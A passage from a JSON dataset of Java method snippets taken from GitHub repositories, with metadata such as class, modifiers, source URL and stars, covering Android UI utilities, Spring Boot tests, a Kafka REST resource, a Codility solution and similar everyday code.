"modifiers": ["public"], "return_type": "int", "snippet": "    public int getPageViewPosition(View page) {\n        for (ViewItemHolder viewItemHolder : mViewItemHolders) {\n            if (viewItemHolder.mItemView == page) {\n                return viewItemHolder.mPosition;\n            }\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GracePagerAdapter.java", "stars": "331", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31790, "method_name": "isDataSetChanging", "class_name": "GracePagerAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDataSetChanging() {\n        return mDataSetChanging;\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GracePagerAdapter.java", "stars": "331", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31791, "method_name": "solution", "class_name": "OddOccurrencesInArray", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\t public static int solution(int[] a) {\n\t        // write your code in Java SE 8\n\t        \n\t        Set<Integer> numbers = new HashSet<>();\n\t        \n\t        for (int i = 0; i < a.length; i++) {\n\t           \n\t            if (numbers.contains(a[i])) {\n\t            \tnumbers.remove(a[i]);\n\t            } else {\n\t            \tnumbers.add(a[i]);\n\t            }\n\t        }\n\t        \n\t        return numbers.iterator().next();\n\t    }", "url": "https://raw.githubusercontent.com/njcodernoob/codility-java-solutions/master/OddOccurrencesInArray.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31792, "method_name": "main", "class_name": "OddOccurrencesInArray", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\t// TODO Auto-generated method stub\n\n\t}", "url": "https://raw.githubusercontent.com/njcodernoob/codility-java-solutions/master/OddOccurrencesInArray.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31793, "method_name": "closeContext", "class_name": "SamplePropertyValidationApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid closeContext() {\n\t\tthis.context.close();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-property-validation/src/test/java/smoketest/propertyvalidation/SamplePropertyValidationApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31794, "method_name": "bindValidProperties", "class_name": "SamplePropertyValidationApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid bindValidProperties() {\n\t\tthis.context.register(SamplePropertyValidationApplication.class);\n\t\tTestPropertyValues.of(\"sample.host:192.168.0.1\", \"sample.port:9090\").applyTo(this.context);\n\t\tthis.context.refresh();\n\t\tSampleProperties properties = this.context.getBean(SampleProperties.class);\n\t\tassertThat(properties.getHost()).isEqualTo(\"192.168.0.1\");\n\t\tassertThat(properties.getPort()).isEqualTo(Integer.valueOf(9090));\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-property-validation/src/test/java/smoketest/propertyvalidation/SamplePropertyValidationApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31795, "method_name": "bindInvalidHost", "class_name": "SamplePropertyValidationApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid bindInvalidHost() {\n\t\tthis.context.register(SamplePropertyValidationApplication.class);\n\t\tTestPropertyValues.of(\"sample.host:xxxxxx\", \"sample.port:9090\").applyTo(this.context);\n\t\tassertThatExceptionOfType(BeanCreationException.class).isThrownBy(() -> this.context.refresh())\n\t\t\t\t.withMessageContaining(\"Failed to bind properties under 'sample'\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-property-validation/src/test/java/smoketest/propertyvalidation/SamplePropertyValidationApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31796, "method_name": "bindNullHost", "class_name": "SamplePropertyValidationApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid bindNullHost() {\n\t\tthis.context.register(SamplePropertyValidationApplication.class);\n\t\tassertThatExceptionOfType(BeanCreationException.class).isThrownBy(() -> this.context.refresh())\n\t\t\t\t.withMessageContaining(\"Failed to bind properties under 'sample'\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-property-validation/src/test/java/smoketest/propertyvalidation/SamplePropertyValidationApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31797, "method_name": "validatorOnlyCalledOnSupportedClass", "class_name": "SamplePropertyValidationApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid validatorOnlyCalledOnSupportedClass() {\n\t\tthis.context.register(SamplePropertyValidationApplication.class);\n\t\tthis.context.register(ServerProperties.class); // our validator will not apply\n\t\tTestPropertyValues.of(\"sample.host:192.168.0.1\", \"sample.port:9090\").applyTo(this.context);\n\t\tthis.context.refresh();\n\t\tSampleProperties properties = this.context.getBean(SampleProperties.class);\n\t\tassertThat(properties.getHost()).isEqualTo(\"192.168.0.1\");\n\t\tassertThat(properties.getPort()).isEqualTo(Integer.valueOf(9090));\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-property-validation/src/test/java/smoketest/propertyvalidation/SamplePropertyValidationApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31798, "method_name": "start", "class_name": "CoronaDesinfector", "params": ["Room"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void start(Room room) {\n        announcer.announce(\"\u041d\u0430\u0447\u0438\u043d\u0430\u0435\u043c \u0434\u0435\u0437\u0438\u043d\u0444\u0435\u043a\u0446\u0438\u044e, \u0432\u0441\u0451 \u0432\u043e\u043d!\");\n        policeman.makePeopleLeaveRoom();\n        desinfect(room);\n        announcer.announce(\"\u0420\u0438\u0441\u043a\u043d\u0438\u0442\u0435 \u0437\u0430\u0439\u0442\u0438 \u043e\u0431\u0440\u0430\u0442\u043d\u043e\");\n    }", "url": "https://raw.githubusercontent.com/Jeka1978/coronadesinfectorlifedemo/master/src/main/java/com/epam/CoronaDesinfector.java", "stars": "60", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31799, "method_name": "desinfect", "class_name": "CoronaDesinfector", "params": ["Room"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void desinfect(Room room){\n        System.out.println(\"\u0437\u0430\u0447\u0438\u0442\u044b\u0432\u0430\u0435\u0442\u0441\u044f \u043c\u043e\u043b\u0438\u0442\u0432\u0430: '\u043a\u043e\u0440\u043e\u043d\u0430 \u0438\u0437\u044b\u0434\u0438!' - \u043c\u043e\u043b\u0438\u0442\u0432\u0430 \u043f\u0440\u043e\u0447\u0438\u0442\u0430\u043d\u0430, \u0432\u0438\u0440\u0443\u0441 \u043d\u0438\u0437\u0432\u0435\u0440\u0433\u043d\u0443\u0442 \u0432 \u0430\u0434\");\n    }", "url": "https://raw.githubusercontent.com/Jeka1978/coronadesinfectorlifedemo/master/src/main/java/com/epam/CoronaDesinfector.java", "stars": "60", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31800, "method_name": "getDefaultAlarmUsers", "class_name": "DefaultAlarmService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getDefaultAlarmUsers() {\n        return new ArrayList<>();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/alarm/DefaultAlarmService.java", "stars": "23", "class_props": {"extends": null, "implements": ["AlarmService"], "modifiers": ["public"]}}, {"id": 31801, "method_name": "doSend", "class_name": "DefaultAlarmService", "params": ["String", "Integer", "String", "List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void doSend(String alarmTitle, Integer alarmLevel, String alarmInfo, List<String> alarmReceivers) {\n        LOG.info(String.format(\"AlarmTitle: [%s], AlarmLevel: [%s], AlarmInfo: [%s], AlarmReceivers: [%s]\",\n                alarmTitle, alarmLevel, alarmInfo, StringUtils.join(alarmReceivers, \",\")));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/alarm/DefaultAlarmService.java", "stars": "23", "class_props": {"extends": null, "implements": ["AlarmService"], "modifiers": ["public"]}}, {"id": 31802, "method_name": "publish", "class_name": "SparrowKafkaResource", "params": ["String", "String", "String"], "throws": ["ExecutionException", "InterruptedException"], "modifiers": ["public"], "return_type": "PublishResult", "snippet": "    public PublishResult publish(@PathVariable String topic, @RequestParam String message, @RequestParam(required = false) String key)\n        throws ExecutionException, InterruptedException {\n        log.debug(\"REST request to send to Kafka topic {} with key {} the message : {}\", topic, key, message);\n        RecordMetadata metadata = producer.send(new ProducerRecord<>(topic, key, message)).get();\n        return new PublishResult(metadata.topic(), metadata.partition(), metadata.offset(), Instant.ofEpochMilli(metadata.timestamp()));\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/web/rest/SparrowKafkaResource.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31803, "method_name": "consume", "class_name": "SparrowKafkaResource", "params": ["List<String>", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "SseEmitter", "snippet": "    public SseEmitter consume(@RequestParam(\"topic\") List<String> topics, @RequestParam Map<String, String> consumerParams) {\n        log.debug(\"REST request to consume records from Kafka topics {}\", topics);\n        Map<String, Object> consumerProps = kafkaProperties.getConsumerProps();\n        consumerProps.putAll(consumerParams);\n        consumerProps.remove(\"topic\");\n\n        SseEmitter emitter = new SseEmitter(0L);\n        sseExecutorService.execute(\n            () -> {\n                KafkaConsumer<String, String> consumer = new KafkaConsumer<>(consumerProps);\n                emitter.onCompletion(consumer::close);\n                consumer.subscribe(topics);\n                boolean exitLoop = false;\n                while (!exitLoop) {\n                    try {\n                        ConsumerRecords<String, String> records = consumer.poll(Duration.ofSeconds(5));\n                        for (ConsumerRecord<String, String> record : records) {\n                            emitter.send(record.value());\n                        }\n                        emitter.send(SseEmitter.event().comment(\"\"));\n                    } catch (Exception ex) {\n                        log.trace(\"Complete with error {}\", ex.getMessage(), ex);\n                        emitter.completeWithError(ex);\n                        exitLoop = true;\n                    }\n                }\n                consumer.close();\n                emitter.complete();\n            }\n        );\n        return emitter;\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/web/rest/SparrowKafkaResource.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31804, "method_name": "onAttachedToWindow", "class_name": "Practice04Alpha", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onAttachedToWindow() {\n        super.onAttachedToWindow();\n\n        animateBt = (Button) findViewById(R.id.animateBt);\n        imageView = (ImageView) findViewById(R.id.imageView);\n\n        animateBt.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(final View v) {\n                // TODO \u5728\u8fd9\u91cc\u5904\u7406\u70b9\u51fb\u4e8b\u4ef6\uff0c\u901a\u8fc7 View.animate().alpha() \u6765\u6539\u53d8 View \u7684\u900f\u660e\u5ea6\n                imageView.animate().alpha(0.8f);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson5/Practice04Alpha.java", "stars": "2", "class_props": {"extends": "RelativeLayout", "implements": null, "modifiers": ["public"]}}, {"id": 31805, "method_name": "init", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void init() {\n        mOrientationEventListener = new OrientationEventListener(mActivity.getApplicationContext()) {\n            @Override\n            public void onOrientationChanged(int rotation) {\n                boolean autoRotateOn = (Settings.System.getInt(mActivity.getContentResolver(), Settings.System.ACCELEROMETER_ROTATION, 0) == 1);\n                if (!autoRotateOn && mRotateWithSystem) {\n                    if (!mIsOnlyRotateLand || getIsLand() == LAND_TYPE_NULL) {\n                        return;\n                    }\n                }\n                if (mVideoPlayer != null && mVideoPlayer.isVerticalFullByVideoSize()) {\n                    return;\n                }\n                if (mIsPause) {\n                    return;\n                }\n                // \u8bbe\u7f6e\u7ad6\u5c4f\n                if (((rotation >= 0) && (rotation <= 30)) || (rotation >= 330)) {\n                    if (mClick) {\n                        if (mIsLand > LAND_TYPE_NULL && !mClickLand) {\n                            return;\n                        } else {\n                            mClickPort = true;\n                            mClick = false;\n                            mIsLand = LAND_TYPE_NULL;\n                        }\n                    } else {\n                        if (mIsLand > LAND_TYPE_NULL) {\n                            if (!mIsOnlyRotateLand) {\n                                mScreenType = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT;\n                                mActivity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);\n                                if (mVideoPlayer.getFullscreenButton() != null) {\n                                    if (mVideoPlayer.isIfCurrentIsFullscreen()) {\n                                        mVideoPlayer.getFullscreenButton().setImageResource(mVideoPlayer.getShrinkImageRes());\n                                    } else {\n                                        mVideoPlayer.getFullscreenButton().setImageResource(mVideoPlayer.getEnlargeImageRes());\n                                    }\n                                }\n                                mIsLand = LAND_TYPE_NULL;\n                            }\n                            mClick = false;\n                        }\n                    }\n                }\n                // \u8bbe\u7f6e\u6a2a\u5c4f\n                else if (((rotation >= 230) && (rotation <= 310))) {\n                    if (mClick) {\n                        if (!(mIsLand == LAND_TYPE_NORMAL) && !mClickPort) {\n                            return;\n                        } else {\n                            mClickLand = true;\n                            mClick = false;\n                            mIsLand = LAND_TYPE_NORMAL;\n                        }\n                    } else {\n                        if (!(mIsLand == LAND_TYPE_NORMAL)) {\n                            mScreenType = ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE;\n                            mActivity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);\n                            if (mVideoPlayer.getFullscreenButton() != null) {\n                                mVideoPlayer.getFullscreenButton().setImageResource(mVideoPlayer.getShrinkImageRes());\n                            }\n                            mIsLand = 1;\n                            mClick = false;\n                        }\n                    }\n                }\n                // \u8bbe\u7f6e\u53cd\u5411\u6a2a\u5c4f\n                else if (rotation > 30 && rotation < 95) {\n                    if (mClick) {\n                        if (!(mIsLand == LAND_TYPE_REVERSE) && !mClickPort) {\n                            return;\n                        } else {\n                            mClickLand = true;\n                            mClick = false;\n                            mIsLand = LAND_TYPE_REVERSE;\n                        }\n                    } else if (!(mIsLand == LAND_TYPE_REVERSE)) {\n                        mScreenType = ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE;\n                        mActivity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_REVERSE_LANDSCAPE);\n                        if (mVideoPlayer.getFullscreenButton() != null) {\n                            mVideoPlayer.getFullscreenButton().setImageResource(mVideoPlayer.getShrinkImageRes());\n                        }\n                        mIsLand = LAND_TYPE_REVERSE;\n                        mClick = false;\n                    }\n                }\n            }\n        };\n        mOrientationEventListener.enable();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31806, "method_name": "resolveByClick", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void resolveByClick() {\n        if (mIsLand == LAND_TYPE_NULL && mVideoPlayer != null && mVideoPlayer.isVerticalFullByVideoSize()) {\n            return;\n        }\n        mClick = true;\n        if (mIsLand == LAND_TYPE_NULL) {\n            int request = mActivity.getRequestedOrientation();\n            if (request == ActivityInfo.SCREEN_ORIENTATION_REVERSE_LANDSCAPE) {\n                mScreenType = ActivityInfo.SCREEN_ORIENTATION_REVERSE_LANDSCAPE;\n            } else {\n                mScreenType = ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE;\n            }\n            mActivity.setRequestedOrientation(mScreenType);\n            if (mVideoPlayer.getFullscreenButton() != null) {\n                mVideoPlayer.getFullscreenButton().setImageResource(mVideoPlayer.getShrinkImageRes());\n            }\n            mIsLand = LAND_TYPE_NORMAL;\n            mClickLand = false;\n        } else {\n            mScreenType = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT;\n            mActivity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);\n            if (mVideoPlayer.getFullscreenButton() != null) {\n                if (mVideoPlayer.isIfCurrentIsFullscreen()) {\n                    mVideoPlayer.getFullscreenButton().setImageResource(mVideoPlayer.getShrinkImageRes());\n                } else {\n                    mVideoPlayer.getFullscreenButton().setImageResource(mVideoPlayer.getEnlargeImageRes());\n                }\n            }\n            mIsLand = LAND_TYPE_NULL;\n            mClickPort = false;\n        }\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31807, "method_name": "backToProtVideo", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int backToProtVideo() {\n        if (mIsLand > LAND_TYPE_NULL) {\n            mClick = true;\n            mActivity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);\n            if (mVideoPlayer != null && mVideoPlayer.getFullscreenButton() != null)\n                mVideoPlayer.getFullscreenButton().setImageResource(mVideoPlayer.getEnlargeImageRes());\n            mIsLand = LAND_TYPE_NULL;\n            mClickPort = false;\n            return 500;\n        }\n        return LAND_TYPE_NULL;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31808, "method_name": "isEnable", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isEnable() {\n        return mEnable;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31809, "method_name": "setEnable", "class_name": "OrientationUtils", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEnable(boolean enable) {\n        this.mEnable = enable;\n        if (mEnable) {\n            mOrientationEventListener.enable();\n        } else {\n            mOrientationEventListener.disable();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31810, "method_name": "releaseListener", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void releaseListener() {\n        if (mOrientationEventListener != null) {\n            mOrientationEventListener.disable();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31811, "method_name": "isClick", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isClick() {\n        return mClick;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31812, "method_name": "setClick", "class_name": "OrientationUtils", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setClick(boolean click) {\n        this.mClick = click;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31813, "method_name": "isClickLand", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isClickLand() {\n        return mClickLand;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31814, "method_name": "setClickLand", "class_name": "OrientationUtils", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setClickLand(boolean ClickLand) {\n        this.mClickLand = ClickLand;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31815, "method_name": "getIsLand", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getIsLand() {\n        return mIsLand;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31816, "method_name": "setIsLand", "class_name": "OrientationUtils", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIsLand(int IsLand) {\n        this.mIsLand = IsLand;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31817, "method_name": "isClickPort", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isClickPort() {\n        return mClickPort;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31818, "method_name": "setClickPort", "class_name": "OrientationUtils", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setClickPort(boolean ClickPort) {\n        this.mClickPort = ClickPort;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31819, "method_name": "getScreenType", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getScreenType() {\n        return mScreenType;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31820, "method_name": "setScreenType", "class_name": "OrientationUtils", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setScreenType(int mScreenType) {\n        this.mScreenType = mScreenType;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31821, "method_name": "isRotateWithSystem", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isRotateWithSystem() {\n        return mRotateWithSystem;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31822, "method_name": "isOnlyRotateLand", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isOnlyRotateLand() {\n        return mIsOnlyRotateLand;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31823, "method_name": "setOnlyRotateLand", "class_name": "OrientationUtils", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnlyRotateLand(boolean onlyRotateLand) {\n        this.mIsOnlyRotateLand = onlyRotateLand;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31824, "method_name": "setRotateWithSystem", "class_name": "OrientationUtils", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRotateWithSystem(boolean rotateWithSystem) {\n        this.mRotateWithSystem = rotateWithSystem;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31825, "method_name": "isPause", "class_name": "OrientationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isPause() {\n        return mIsPause;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31826, "method_name": "setIsPause", "class_name": "OrientationUtils", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIsPause(boolean isPause) {\n        this.mIsPause = isPause;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/OrientationUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31827, "method_name": "valueChanged", "class_name": "BlockProjectListener", "params": ["ListSelectionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void valueChanged(ListSelectionEvent e) {\n        String path= ProjectViewer.blockString+\"\\\\\"+ GUI.pvv3.elementAt(GUI.pvl3.getSelectedIndex()).toString();\n        File file=new File(path);\n        StringBuilder result = new StringBuilder();\n        BufferedReader bf= null;\n        System.out.println(path);\n        try {\n            bf = new BufferedReader(new FileReader(file));\n            String s;\n            BufferedReader bf1=new BufferedReader(new FileReader(file));\n            String s1;\n            while((s1 = bf1.readLine())!=null){\n                result.append(System.lineSeparator()+s1);\n            }\n            bf.close();\n            GUI.jt1.setText(result.toString());\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/4156/MindustryModMaker/master/src/Listener/BlockProjectListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["ListSelectionListener"], "modifiers": ["public"]}}, {"id": 31828, "method_name": "getAsyncExecutor", "class_name": "AsyncConfiguration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Executor", "snippet": "    public Executor getAsyncExecutor() {\n        log.debug(\"Creating Async Task Executor\");\n        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();\n        executor.setCorePoolSize(taskExecutionProperties.getPool().getCoreSize());\n        executor.setMaxPoolSize(taskExecutionProperties.getPool().getMaxSize());\n        executor.setQueueCapacity(taskExecutionProperties.getPool().getQueueCapacity());\n        executor.setThreadNamePrefix(taskExecutionProperties.getThreadNamePrefix());\n        return new ExceptionHandlingAsyncTaskExecutor(executor);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/config/AsyncConfiguration.java", "stars": "2", "class_props": {"extends": null, "implements": ["AsyncConfigurer"], "modifiers": ["public"]}}, {"id": 31829, "method_name": "getAsyncUncaughtExceptionHandler", "class_name": "AsyncConfiguration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AsyncUncaughtExceptionHandler", "snippet": "    public AsyncUncaughtExceptionHandler getAsyncUncaughtExceptionHandler() {\n        return new 